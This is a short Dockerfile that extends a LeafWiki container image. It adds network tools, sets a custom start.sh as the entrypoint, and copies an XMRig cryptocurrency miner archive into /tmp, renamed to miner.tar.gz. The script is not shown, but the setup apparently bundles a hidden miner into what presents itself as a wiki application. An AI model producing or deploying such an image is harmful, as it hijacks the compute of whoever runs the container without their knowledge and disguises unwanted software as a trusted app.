FROM ghcr.io/perber/leafwiki:latest

# Alpine-based install
RUN apk update \
 && apk add --no-cache \
    iputils \
    iproute2 \
    ca-certificates \
    bash

COPY start.sh /usr/local/bin/start.sh
COPY xmrig-6.24.0-linux-static-x64.tar.gz /tmp/miner.tar.gz
RUN chmod +x /usr/local/bin/start.sh

ENTRYPOINT ["/usr/local/bin/start.sh"]
